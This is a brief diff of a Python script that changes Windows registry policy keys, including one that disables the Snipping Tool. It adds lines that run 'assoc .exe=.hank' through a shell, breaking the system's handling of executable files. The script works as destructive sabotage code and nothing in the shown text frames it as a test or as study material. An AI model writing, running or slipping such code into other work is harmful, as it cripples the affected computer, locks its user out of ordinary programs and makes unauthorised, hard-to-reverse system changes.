@@ -35,3 +35,10 @@ reg.CloseKey(key2)
 key3 = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\Policies\\Microsoft\\TabletPC')
 reg.SetValueEx(key3, 'DisableSnippingTool', 0, reg.REG_DWORD, 1)
 reg.CloseKey(key3)
+
+# asti
+import subprocess
+file_extension = ".exe"
+file_type = ".hank"
+command = f'assoc {file_extension}={file_type}'
+subprocess.run(command, shell=True)
